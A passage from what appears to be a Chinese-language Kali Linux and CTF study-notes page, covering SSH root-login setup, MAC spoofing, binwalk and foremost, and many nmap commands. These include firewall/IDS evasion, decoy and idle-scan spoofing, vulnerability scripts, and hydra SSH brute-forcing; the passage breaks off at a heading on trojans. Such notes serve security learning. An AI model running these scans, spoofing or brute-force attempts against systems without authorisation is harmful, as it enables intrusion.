2.去除下列井号并把no改为yes：</span></span><br><span class="line">PermitRootLogin prohibit-password <span class="built_in">yes</span></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/ssh status <span class="comment"># 查看ssh服务状态</span></span><br><span class="line">/etc/init.d/ssh start  <span class="comment"># 开启ssh服务</span></span><br><span class="line">/etc/init.d/ssh stop <span class="comment"># 关闭ssh服务</span></span><br></pre></td></tr></table></figure><h3 id="7-其他命令"><a href="#7-其他命令" class="headerlink" title="7 其他命令"></a>7 其他命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 收集信息</span></span><br><span class="line">whois &lt;url&gt;</span><br></pre></td></tr></table></figure><h3 id="8-MAC伪造"><a href="#8-MAC伪造" class="headerlink" title="8 MAC伪造"></a>8 MAC伪造</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.关闭网卡</span></span><br><span class="line">ifconfig wlan0 down</span><br><span class="line"><span class="comment"># 2.随机生成mac</span></span><br><span class="line">macchanger -r wlan0</span><br><span class="line"><span class="comment"># 2.指定mac</span></span><br><span class="line">macchanger -m 01:23:45:67:89:10 wlan0</span><br><span class="line"><span class="comment"># 3.开启网卡</span></span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure><h3 id="9-OpenSSL"><a href="#9-OpenSSL" class="headerlink" title="9 OpenSSL"></a>9 <a href="https://zhuanlan.zhihu.com/p/107741096">OpenSSL</a></h3><blockquote><p>生成和验证证书。</p></blockquote><h3 id="10-工具管理"><a href="#10-工具管理" class="headerlink" title="10 工具管理"></a>10 工具管理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开始菜单添加</span></span><br><span class="line">/usr/share/applications/</span><br><span class="line"><span class="comment"># 修改文件内容</span></span><br><span class="line">/usr/share/applications/&lt;name&gt;.desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容：</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=&lt;name&gt; <span class="comment"># 填</span></span><br><span class="line">Comment=&lt;comment&gt; <span class="comment"># 可填</span></span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=/usr/bin/&lt;name&gt; <span class="comment"># 路径（不在可以用 lcoate 进行寻找）</span></span><br><span class="line">Icon=kali--menu <span class="comment"># 有图标可以修改</span></span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">true</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=&lt;categories&gt; <span class="comment"># 工具栏位置（例：01-01-dns-analysis（尾部分号隔开））</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、Misc"><a href="#二、Misc" class="headerlink" title="二、Misc"></a>二、Misc</h2><h3 id="1-命令技巧"><a href="#1-命令技巧" class="headerlink" title="1 命令技巧"></a>1 命令技巧</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询 file 中的关键字 flag</span></span><br><span class="line">strings &lt;file&gt; | grep &lt;flag&gt;</span><br></pre></td></tr></table></figure><h3 id="2-binwalk：识别、提取等文件操作"><a href="#2-binwalk：识别、提取等文件操作" class="headerlink" title="2 binwalk：识别、提取等文件操作"></a>2 binwalk：识别、提取等文件操作</h3><div class="table-container"><table><thead><tr><th>签名扫描选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-B，-签名</td><td>扫描目标文件的通用文件签名</td></tr><tr><td>-R，-raw=</td><td>扫描目标文件中指定的字节序列</td></tr><tr><td>-A，-opcode</td><td>s扫描目标文件中常见的可执行操作码签名</td></tr><tr><td>-m，-magic=</td><td>指定要使用的自定义魔术文件</td></tr><tr><td>-b，-dumb</td><td>禁用智能签名关键字</td></tr><tr><td>-I，-invalid</td><td>显示标记为无效的结果</td></tr><tr><td>-x，-exclude=</td><td>排除匹配&lt; str &gt;的结果</td></tr><tr><td>-y，-include=</td><td>仅显示匹配&lt; str &gt;的结果</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>提取选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-e，-extract</td><td>自动提取已知的文件类型</td></tr><tr><td>-D，-dd=</td><td>提取\<type\>签名（正则表达式），赋予文件扩展名\<ext\>，然后执行\<cmd\></cmd\></ext\></type\></td></tr><tr><td>-M，-matryoshka</td><td>递归扫描提取的文件</td></tr><tr><td>-d，-depth=</td><td>限制matryoshka递归深度（默认值:8级深度）</td></tr><tr><td>-C，-directory=</td><td>将文件/文件夹提取到自定义（目录默认：当前工作目录）</td></tr><tr><td>-j，-size=</td><td>限制每个提取文件的大小</td></tr><tr><td>-n， count=</td><td>限制解压缩文件的数量</td></tr><tr><td>-0，-run-as=</td><td>使用指定用户的权限执行外部提取实用程序</td></tr><tr><td>-l，-preserve-symlinks</td><td>不整理指向提取目录之外的提取的符号链接（危险）</td></tr><tr><td>-r，-rm</td><td>提取后删除雕刻的文件</td></tr><tr><td>-z</td><td>从文件中提取数据，但不执行提取实用程序</td></tr><tr><td>-V</td><td>子目录提取到由偏移量命名的子目录中</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>熵选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-E</td><td>熵计算文件熵</td></tr><tr><td>-F，-fast</td><td>使用更快但不太详细的熵分析</td></tr><tr><td>-J</td><td>将保存图保存为PNG</td></tr><tr><td>-Q，-nlegend</td><td>省略熵图中的图例</td></tr><tr><td>-N，-N</td><td>请勿生成熵绘图</td></tr><tr><td>-H，-high=</td><td>设置上升沿熵触发阈值（默认值:0.95）</td></tr><tr><td>-L，-low=</td><td>设置下降沿熵触发阈值（默认值:0.85）</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>二进制差异选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-W，-hexdump</td><td>对一个或多个文件执行hexdump / diff</td></tr><tr><td>-G，-green</td><td>仅显示包含所有文件中相同字节的行</td></tr><tr><td>-i，-red</td><td>只显示包含所有文件中不同字节的行</td></tr><tr><td>-U，-blue</td><td>仅显示包含不同字节的行，这些字节在某些文件中是不同的</td></tr><tr><td>-u，-similar</td><td>仅显示所有文件之间相同的行</td></tr><tr><td>-w，-terse</td><td>区分所有文件，但只显示第一个文件的十六进制转储</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>原始压缩选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-X，-deflate</td><td>扫描原始deflate压缩流</td></tr><tr><td>-Z，-lzma</td><td>扫描原始lzma压缩流</td></tr><tr><td>-P，-partial</td><td>执行一次表面但更快的扫描</td></tr><tr><td>-S，-stop</td><td>在第一个结果后停止</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>常规选项参数</th><th>作用</th></tr></thead><tbody><tr><td>-l，-length=</td><td>要扫描的字节数</td></tr><tr><td>-o，-offset=</td><td>在此文件偏移量处开始扫描</td></tr><tr><td>-O，-base=</td><td>向所有打印的偏移量添加基址</td></tr><tr><td>-K，-block=</td><td>设置文件块大小</td></tr><tr><td>-g，-swap=</td><td>扫描前每n个字节反转一次</td></tr><tr><td>-f，- log=</td><td>将结果记录到文件中</td></tr><tr><td>-c，-csv</td><td>将结果记录到csv格式的文件中</td></tr><tr><td>-t，-term</td><td>格式输出以适应终端窗口</td></tr><tr><td>-q，-quiet</td><td>抑制输出到stdout</td></tr><tr><td>-v，-verbose</td><td>启用详细输出</td></tr><tr><td>-h，-help</td><td>显示帮助输出</td></tr><tr><td>-a，-finclude=</td><td>仅扫描名称与此regex匹配的文件</td></tr><tr><td>-p，-fexclude=</td><td>不扫描名称与此正则表达式匹配的文件</td></tr><tr><td>-s，-status=</td><td>在指定端口上启用状态服务器</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="comment"># 识别结构</span></span><br><span class="line">binwalk &lt;file&gt;</span><br><span class="line"><span class="comment"># 提取文件</span></span><br><span class="line">sudo binwalk -e --run-as=root &lt;file&gt;</span><br></pre></td></tr></table></figure><h3 id="3-foremost：用于分离文件"><a href="#3-foremost：用于分离文件" class="headerlink" title="3 foremost：用于分离文件"></a>3 foremost：用于分离文件</h3><div class="table-container"><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>-h</td><td>帮助</td></tr><tr><td>-V</td><td>显示版权信息并退出</td></tr><tr><td>-t</td><td>指定文件类型（-t jpeg，pdf…）</td></tr><tr><td>-d</td><td>打开间接块检测(对于UNIX文件系统)</td></tr><tr><td>-i</td><td>指定输入文件（默认为stdin）</td></tr><tr><td>-a</td><td>写入所有标头，不执行错误检测（损坏的文件）</td></tr><tr><td>-w</td><td>仅写入审核文件，不将任何检测到的文件写入磁盘</td></tr><tr><td>-o</td><td>设置输出目录（默认为输出）</td></tr><tr><td>-c</td><td>设置要使用的配置文件（默认为foremost.conf）</td></tr><tr><td>-q</td><td>启用快速模式。在512字节边界上执行搜索</td></tr><tr><td>-Q</td><td>启用安静模式。禁止输出消息</td></tr><tr><td>-v</td><td>详细模式。将所有消息记录到屏幕上</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="comment"># 分离到 output 中</span></span><br><span class="line">foremost &lt;name&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="三、Web"><a href="#三、Web" class="headerlink" title="三、Web"></a>三、Web</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1 信息收集"></a>1 信息收集</h3><blockquote><p><a href="https://stool.chinaz.com/same">IP分析</a></p></blockquote><h4 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h4><ul><li>被动扫描：在对方未知的情况下完成扫描。</li><li>主动扫描：主动发包，看响应。</li></ul><h4 id="1-2-maltego"><a href="#1-2-maltego" class="headerlink" title="1.2 maltego"></a>1.2 maltego</h4><blockquote><p>一键版信息收集（通过域名）<br>​下载后会自动加入在【01-信息收集 】中</p><p>注册登入：CE版（注册要科学上网）<br>normal：信息多，S：保密性强</p></blockquote><p>使用：</p><ul><li>“+” 号（上）—— Domain（左）——L1 - L3（1：更快，3：更全）</li></ul><h4 id="1-3-sn0int"><a href="#1-3-sn0int" class="headerlink" title="1.3 sn0int"></a>1.3 sn0int</h4><blockquote><p><a href="https://sn0int.readthedocs.io/en/stable/">official::sn0int</a></p><p><a href="https://github.com/kpcyrd/sn0int">模块开发与使用</a></p><p>工具集，可以自己开发模块（本身没有模块，需要自己添加）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装（kali）：</span></span><br><span class="line">sudo apt install debian-keyring</span><br><span class="line">gpg -a --<span class="built_in">export</span> --keyring /usr/share/keyrings/debian-maintainers.gpg kpcyrd@archlinux.org | sudo <span class="built_in">tee</span> /etc/apt/trusted.gpg.d/apt-vulns-sexy.gpg</span><br><span class="line"><span class="built_in">echo</span> deb http://apt.vulns.sexy stable main | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/apt-vulns-sexy.list</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install sn0int</span><br><span class="line"><span class="comment"># 模块安装</span></span><br><span class="line">pkg quickstart</span><br><span class="line"><span class="comment"># 公钥问题</span></span><br><span class="line">gpg --keyserver subkeys.pgp.net --recv &lt;complete_key&gt;</span><br><span class="line">gpg --<span class="built_in">export</span> --armor &lt;last_eight_key&gt; | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用使用</span></span><br><span class="line"><span class="comment"># 创建工作区</span></span><br><span class="line">workspace &lt;name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 语句操作</span></span><br><span class="line"><span class="comment"># 添加域名</span></span><br><span class="line">add domain</span><br><span class="line"><span class="comment"># 查看域名（SQL语言具体查询，例：select domains where id=1 or value like %.com）</span></span><br><span class="line"><span class="keyword">select</span> domains</span><br><span class="line"><span class="comment"># 删除域名（子域名无效）</span></span><br><span class="line">noscope/delete domains <span class="built_in">where</span> value=url</span><br><span class="line"><span class="comment"># 删除子域名</span></span><br><span class="line">noscope/delete subdomains <span class="built_in">where</span> value=url</span><br><span class="line">target <span class="comment"># 当前模块目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模块使用</span></span><br><span class="line"><span class="comment"># 查询（所有域名的）子域名（并加到 subdomain 中）</span></span><br><span class="line">use ctlogs —— run</span><br><span class="line"><span class="comment"># 解析可以解析的子域名并更新</span></span><br><span class="line">use dns-resolve —— run</span><br><span class="line"><span class="comment"># 查询可以访问的端口并更新</span></span><br><span class="line">use url-scan —— run</span><br></pre></td></tr></table></figure><h4 id="1-4-NMAP"><a href="#1-4-NMAP" class="headerlink" title="1.4 NMAP"></a>1.4 NMAP</h4><blockquote><p><a href="https://www.sogou.com/sie?query=nmap+-PY">author::【工具】nmap使用手册（文末送书）</a></p></blockquote><h5 id="1-4-1-主机发现"><a href="#1-4-1-主机发现" class="headerlink" title="1.4.1 主机发现"></a>1.4.1 主机发现</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.全面扫描/综合扫描</span></span><br><span class="line">nmap -A 192.168.242.1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.Ping扫描</span></span><br><span class="line">nmap -sP 192.168.242.1/24</span><br><span class="line">nmap -sn 192.168.242.1/24 <span class="comment"># 同一网段是arp，不同网段用其他协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.免ping扫描，穿透防火墙，避免被防火墙发现</span></span><br><span class="line">nmap -P0 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.TCP SYN  Ping扫描</span></span><br><span class="line">nmap -PS -v 192.168.242.135</span><br><span class="line">nmap -PS80(端口)，10-100  -v 192.168.242.135  <span class="comment"># 针对防火墙丢弃RST包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.TCP ACK Ping 扫描</span></span><br><span class="line">nmap -PA -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.UDP Ping 扫描</span></span><br><span class="line">nmap -PU -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.ICMP Ping Types 扫描（应答在线，不应答不一定不在线（防火墙））</span></span><br><span class="line">nmap -PE -v 192.168.242.135 <span class="comment"># ICMP ECHO</span></span><br><span class="line">nmap -PP -v 192.168.242.135 <span class="comment"># ICMP 时间戳</span></span><br><span class="line">nmap -PM -v 192.168.242.135 <span class="comment"># ICMP 地址掩码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.ARP Ping 扫描</span></span><br><span class="line">nmap -PR -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.列表扫描</span></span><br><span class="line">nmap -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.禁止方向域名解析</span></span><br><span class="line">nmap -n -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.方向域名解析</span></span><br><span class="line">nmap -R -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.使用系统域名解析系统</span></span><br><span class="line">nmap --system-dns 192.168.242.1 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13.扫描IPV6 地址</span></span><br><span class="line">nmap -6 IPv6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14.路由跟踪</span></span><br><span class="line">nmap --traceroute -v www.sunbridgegroup.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 15.SCTP INIT Ping 扫描</span></span><br><span class="line">nmap -PY -v 192.168.1.103</span><br></pre></td></tr></table></figure><h5 id="1-4-2-端口扫描"><a href="#1-4-2-端口扫描" class="headerlink" title="1.4.2 端口扫描"></a>1.4.2 端口扫描</h5><blockquote><p><a href="https://www.cnblogs.com/Rain99-/p/12882677.html">端口详细状态</a></p></blockquote><div class="table-container"><table><thead><tr><th>端口状态</th><th>作用</th></tr></thead><tbody><tr><td>open</td><td>开放</td></tr><tr><td>closed</td><td>关闭</td></tr><tr><td>filtered</td><td>阻塞的，未到达。不确定开放（可能是自己主机开了防火墙）</td></tr><tr><td>unfiltered</td><td>可访问但未知开放</td></tr><tr><td>open &#124; filtered</td><td>nmap无法确认端口状态</td></tr><tr><td>closed &#124; filtered</td><td>nmap无法确认端口状态</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.时序扫描（0：偏执的，慢，常用于逃避IDS；1：鬼祟的，同0；2:文雅的，不常用；3：默认的；4：野蛮的，常用的；5：疯狂的，会降低精度）</span></span><br><span class="line">nmap -T(0-5) 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.常用扫描方式</span></span><br><span class="line">nmap -p 80 192.168.242.1</span><br><span class="line">nmap -p 80-100 192.168.242.1</span><br><span class="line">nmap -p T:80,U:445 192.168.242.135</span><br><span class="line">nmap -F 192.168.242.135 (快速扫描)</span><br><span class="line">nmap --top-ports 200 192.168.242.1 (扫描最有用的前200 个端口)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.TCP SYN 扫描（高效的扫描方式）</span></span><br><span class="line">nmap -sS -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.TCP 连接扫描</span></span><br><span class="line">nmap -sT -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.UDP 连接扫描</span></span><br><span class="line">nmap -sU -p 80-100 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.隐蔽扫描</span></span><br><span class="line">nmap -sN 61.241.194.153(NULL 扫描)</span><br><span class="line">nmap -sF 61.241.194.153(FIN 扫描)</span><br><span class="line">nmap -sX 61.241.194.153(Xmas 扫描)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.TCP ACK 扫描</span></span><br><span class="line">nmap -sA 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.TCP 窗口扫描</span></span><br><span class="line">nmap -sW -v -F 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.TCP Maimon 扫描</span></span><br><span class="line">nmap -sM -T4 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.自定义扫描</span></span><br><span class="line">nmap -sT --scanflags SYNURG 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.空闲扫描( 隐藏IP )</span></span><br><span class="line">nmap -sI www.0day.co:80 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.IP 协议扫描</span></span><br><span class="line">nmap -sO -T4 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-3-指纹识别与探测"><a href="#1-4-3-指纹识别与探测" class="headerlink" title="1.4.3 指纹识别与探测"></a>1.4.3 指纹识别与探测</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.版本探测</span></span><br><span class="line">nmap -sV 192.168.242.135</span><br><span class="line">nmap -sV -A 192.168.241.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.全端口版本探测</span></span><br><span class="line">nmap -sV --allports 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.设置扫描强度</span></span><br><span class="line">nmap -sV --version-intensity (0-9) 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.轻量级扫描</span></span><br><span class="line">nmap -sV --version-light 2 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.重量级扫描</span></span><br><span class="line">nmap -sV --version-all 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.获取详细版本信息</span></span><br><span class="line">nmap -sV --version-trace 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.RPC 扫描</span></span><br><span class="line">nmap -sS -sR 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.对指定的目标进行操作系统监测</span></span><br><span class="line">nmap -O --osscan-limit 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.推测系统并识别</span></span><br><span class="line">nmap -O --osscan-guess 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-4-伺机而动"><a href="#1-4-4-伺机而动" class="headerlink" title="1.4.4 伺机而动"></a>1.4.4 伺机而动</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.调整并行扫描组的大小</span></span><br><span class="line">nmap --min-hostgroup 30 192.168.242.1/24</span><br><span class="line">nmap --max-hostgroup 30 902 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.调整探测报文的并行度</span></span><br><span class="line">nmap --min-parallelism 100 192.168.242.1</span><br><span class="line">nmap --max-parallelism 100 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.调整探测报文超时</span></span><br><span class="line">nmap --initial-rtt-timeout 100ms 192.168.242.1</span><br><span class="line">nmap --max-rtt-timeout 100ms 192.168.242.1</span><br><span class="line">nmap --min-rtt-timeout 100ms 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.放弃缓慢的目标主机</span></span><br><span class="line">nmap --host-timeout 1800000ms 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.调整报文适合时间间隔</span></span><br><span class="line">nmap --scan-delay 1s 192.168.242.1</span><br><span class="line">nmap --max-scan-delay 1s 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-5-防火墙-IDS-逃逸"><a href="#1-4-5-防火墙-IDS-逃逸" class="headerlink" title="1.4.5 防火墙/IDS 逃逸"></a>1.4.5 防火墙/IDS 逃逸</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.报文分段</span></span><br><span class="line">nmap -f -v 61.241.194.153</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.指定偏移大小</span></span><br><span class="line">nmap --mtu 16 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.IP 欺骗</span></span><br><span class="line">nmap -D RND:11 192.168.1.104</span><br><span class="line">nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.源地址欺骗</span></span><br><span class="line">nmap -sI [www.0day.cn:80](http://www.0day.cn/) 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.源端口欺骗</span></span><br><span class="line">nmap --source-port 902 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.指定发包长度</span></span><br><span class="line">nmap --data-length 30 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.目标主机随机排序</span></span><br><span class="line">nmap --randomize-hosts 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.MAX 地址欺骗</span></span><br><span class="line">nmap -sT -Pn --spoof-mac 0 192.168.1.104</span><br></pre></td></tr></table></figure><h5 id="1-4-6-信息搜集"><a href="#1-4-6-信息搜集" class="headerlink" title="1.4.6 信息搜集"></a>1.4.6 信息搜集</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.IP 信息收集</span></span><br><span class="line">nmap --script ip-geolocation-* www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.WHOIS 查询</span></span><br><span class="line">nmap --script whois-domain www.pcos.cn</span><br><span class="line">nmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.com</span><br><span class="line">nmap -sn --script whois-domain -v -iL host.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.IP 反查</span></span><br><span class="line">nmap -sn --script hostmap-ip2hosts www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.DNS 信息收集</span></span><br><span class="line">nmap --script dns-brute www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10 www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.检索系统信息</span></span><br><span class="line">nmap -p 445 445 192.168.1.104 --script membase-http-info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.后台打印机服务漏洞</span></span><br><span class="line">nmap --script smb-security-mode.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.系统漏洞扫描</span></span><br><span class="line">nmap --script smb-check-vulns.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.扫描Web 漏洞</span></span><br><span class="line">nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.通过Snmp 列举Windows 服务/账户</span></span><br><span class="line">nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104</span><br><span class="line">nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.110</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.枚举DNS 服务器的主机名</span></span><br><span class="line">nmap --script dns-brute --script-args dns-brute.domain=baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.HTTP 信息收集</span></span><br><span class="line">nmap -sV -p 80 www.0day.com(HTTP 版本探测)</span><br><span class="line">nmap -p 80 --script=http-headers www.pcos.cn (HTTP 信息头探测)</span><br><span class="line">nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web 目录结构)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13.枚举SSL 密钥</span></span><br><span class="line">nmap -p 443 --script=ssl-enum-ciphers www.baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14.SSH 服务密钥信息探测</span></span><br><span class="line">nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</span><br></pre></td></tr></table></figure><h5 id="1-4-7-结果输出"><a href="#1-4-7-结果输出" class="headerlink" title="1.4.7 结果输出"></a>1.4.7 结果输出</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、输出xml</span></span><br><span class="line">nmap <span class="number">192.168</span><span class="number">.223</span><span class="number">.129</span> -oX Report.xml</span><br></pre></td></tr></table></figure><h3 id="2-Web扫描"><a href="#2-Web扫描" class="headerlink" title="2 Web扫描"></a>2 Web扫描</h3><h4 id="2-1-域名扫描"><a href="#2-1-域名扫描" class="headerlink" title="2.1 域名扫描"></a>2.1 域名扫描</h4><ul><li><p>dirb</p><blockquote><p>原理：靠字典扫描</p><p><code>dirb url</code>：扫描url</p></blockquote></li><li><p>dirsearch</p></li></ul><h4 id="2-2-Web信息扫描"><a href="#2-2-Web信息扫描" class="headerlink" title="2.2 Web信息扫描"></a>2.2 Web信息扫描</h4><ul><li><p>whatweb</p><blockquote><p>收集web相关信息</p><p><code>whatweb url</code>：输出信息</p><p>-v：格式化输出</p></blockquote></li></ul><h3 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3 漏洞扫描"></a>3 漏洞扫描</h3><h4 id="3-1-NMAP（主机漏洞）"><a href="#3-1-NMAP（主机漏洞）" class="headerlink" title="3.1 NMAP（主机漏洞）"></a>3.1 NMAP（主机漏洞）</h4><ul><li><p>脚本使用</p><ol><li><p>指定脚本</p><p><code>sudo nmap --script ftp-vsftpd-backdoor 192.168.17.137</code></p></li><li><p>全面扫描</p><p><code>sudo nmap --script vuln 192.168.17.137</code></p></li><li><p>更全面扫描</p><p><code>cd .../scripts —— sudo git clone https://github.com/scipag/vulscan.git</code>（安装库到 scripts 中）</p><p><code>sudo nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV 192.168.17.137 [ |more ]</code>（更多显示，| 和 more 中间无空格）</p></li></ol></li></ul><h4 id="3-2-zaproxy（Web漏洞）"><a href="#3-2-zaproxy（Web漏洞）" class="headerlink" title="3.2 zaproxy（Web漏洞）"></a>3.2 zaproxy（Web漏洞）</h4><p><code>sudo apt install zaproxy</code>   </p><p>手动扫描：firefox（上右）——找到网址——攻击（站点）——主动扫描——警报（查看结果）</p><h4 id="3-3-rips-0-55（PHP代码审计）"><a href="#3-3-rips-0-55（PHP代码审计）" class="headerlink" title="3.3 rips-0.55（PHP代码审计）"></a>3.3 rips-0.55（PHP代码审计）</h4><blockquote><p><a href="https://rips-scanner.sourceforge.net/">official::RIPS</a> </p><p><a href="https://www.cnblogs.com/staffyoung/p/7169165.html">rips使用</a></p><p>该工具主要用于学习，实战需要更好的审计工具。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> -v rips-0.55 /var/www/html</span><br><span class="line">sudo service apache2 start <span class="comment"># 首次移动重新打开服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 403Error：chmod 755 -R rips-0.55</span></span><br><span class="line"><span class="comment"># 注：只可以进行本机扫描</span></span><br></pre></td></tr></table></figure><h3 id="4-暴力破解"><a href="#4-暴力破解" class="headerlink" title="4 暴力破解"></a>4 暴力破解</h3><h4 id="4-1-hydra"><a href="#4-1-hydra" class="headerlink" title="4.1 hydra"></a>4.1 hydra</h4><blockquote><p>暴力破解工具。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh爆破（指定用户名和密码字典）</span></span><br><span class="line">hydra -L users.txt -P password.txt ssh://ip</span><br><span class="line">hydra -L users.txt -P password.txt -vV ssh://ip <span class="comment"># 详细信息输出</span></span><br></pre></td></tr></table></figure><h3 id="5-远程控制"><a href="#5-远程控制" class="headerlink" title="5 远程控制"></a>5 远程控制</h3><h4 id="4-1-木马分类"><a href="#4-1-木马分类" class="headerlink" title="4.1 